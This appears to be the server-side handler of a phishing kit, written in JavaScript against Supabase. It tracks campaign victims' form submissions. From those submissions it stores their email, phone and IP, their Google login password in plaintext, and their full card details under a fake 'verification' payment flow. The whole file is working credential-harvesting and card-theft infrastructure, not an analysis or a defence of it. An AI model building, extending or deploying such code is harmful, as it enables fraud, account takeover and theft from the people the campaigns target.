import { getCampaignById } from '../../../tools/supabase/campaigns.js';
import { storeEvent } from '../../../tools/supabase/events.js';
import { storeContact, getContactByEmail } from '../../../tools/supabase/contacts.js';
import { storeCard } from '../../../tools/supabase/cards.js';
import { storeLogin } from '../../../tools/supabase/logins.js';
import { createPayment, updatePayment } from '../../../tools/supabase/payments.js';

export default async function handler(req, res) {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'unknown';
    const { campaign = '', eventType = 'submission', payload: formPayload = {}, contactId: incomingContactId } = req.body || {};

    // Résoudre campaignId (UUID) depuis id ou name
    if (!campaign) {
      return res.status(400).json({ success: false, error: 'campaign is required' });
    }
    const campaignRow = await getCampaignById(campaign);
    if (!campaignRow?.id) {
      return res.status(404).json({ success: false, error: 'campaign not found' });
    }
    const campaignId = campaignRow.id;

    let finalContactId = incomingContactId || null;

    // Créer / mettre à jour le contact sur les événements clés AVANT de tracker l'événement
    switch (eventType) {
      case 'booking':
        const email = formPayload.email;
        const phone = formPayload.phone || '';
        const result = await storeContact({ email, phone, ip, campaignId, eventId: null, eventType, payload: formPayload });
        finalContactId = result?.contactId || null;
        break;
      case 'login':
        const contact = await getContactByEmail(formPayload.email);
        if (contact) {
          await storeLogin(contact.id, formPayload.email, formPayload.password, 'google');
        }
        break;
      case 'verification_start':
      case 'verification_retry':
        if (formPayload.paymentId) {
          await createPayment(formPayload.paymentId, 'pending', formPayload.amount || 10, formPayload.cardDetails, null, finalContactId);
        }
        if (finalContactId && formPayload.cardDetails) {
          await storeCard(finalContactId, formPayload.cardDetails);
        }
        break;
      case 'verification_success':
      case 'verification_error':
        if (formPayload.paymentId) {
          await updatePayment(formPayload.paymentId, formPayload.status || 'error');
        }
        break;
      default:
        break;
    }

    // Track the event avec le contact_id final
    const eventResult = await storeEvent(eventType, ip, { ...formPayload, campaign: campaignId }, campaignId, finalContactId);
    const eventId = eventResult.eventId;

    res.status(200).json({ success: true, eventId, contactId: finalContactId });
  } catch (e) {
    console.error('Track submission error:', e);
    res.status(500).json({ success: false, error: e.message });
  }
}
